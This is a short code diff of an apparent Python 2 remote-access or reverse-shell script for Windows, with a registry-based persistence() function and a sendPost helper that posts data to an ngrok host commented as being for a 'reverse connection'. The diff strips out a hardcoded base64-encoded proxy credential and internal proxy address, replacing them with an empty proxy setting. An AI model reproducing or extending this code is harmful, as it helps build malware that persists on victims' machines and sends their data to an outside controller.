@@ -8,6 +8,7 @@ import _winreg as wreg
 import random
 
 url = "http://c33cd106.ngrok.io"    #ngrok to reverse connection
+proxy = {}
 
 
 def persistence():
@@ -29,10 +30,7 @@ def persistence():
 
 
 def sendPost(Url, Data, files=None):
-    token = "cml0MjAxNTA0NA==SWlpdGEwNDQ="
-    u, p = token.split('==')
-    u +="=="
-    response = requests.post(url=Url, data=Data, proxies={'http': "http://"+base64.b64decode(u)+":"+base64.b64decode(p)+"@172.31.1.6:8080"})
+    response = requests.post(url=Url, data=Data, proxies=proxy)
     return response
 
 
